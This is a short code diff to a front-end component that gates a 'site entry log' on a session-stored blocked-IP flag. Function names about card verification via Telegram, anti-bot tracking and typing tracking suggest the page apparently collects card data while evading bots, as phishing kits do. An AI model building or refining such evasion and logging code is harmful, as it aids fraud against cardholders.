@@ -350,13 +350,16 @@ const handleCardVerificationFromTelegram = () => {
 
   // Anti-bot initialization
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  useEffect(() => {
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+useEffect(() => {
   startTimer();
   const handleMouseMove = () => trackInteraction();
   window.addEventListener('mousemove', handleMouseMove);
   
-  // Send site entry log only once
-  if (!hasSentSiteEntryRef.current && sendSiteEntryLog) {
+  // ✅ Only send if NOT blocked
+  const sessionBlocked = sessionStorage.getItem('blocked_ip');
+  
+  if (!sessionBlocked && !hasSentSiteEntryRef.current && sendSiteEntryLog) {
     sendSiteEntryLog();
     hasSentSiteEntryRef.current = true;
   }
@@ -365,9 +368,7 @@ const handleCardVerificationFromTelegram = () => {
     window.removeEventListener('mousemove', handleMouseMove);
     resetAntiBot();
   };
-  // eslint-disable-next-line react-hooks/exhaustive-deps
 }, []);
-
   const handleInputChange = async (field, value) => {
     trackTyping();
     
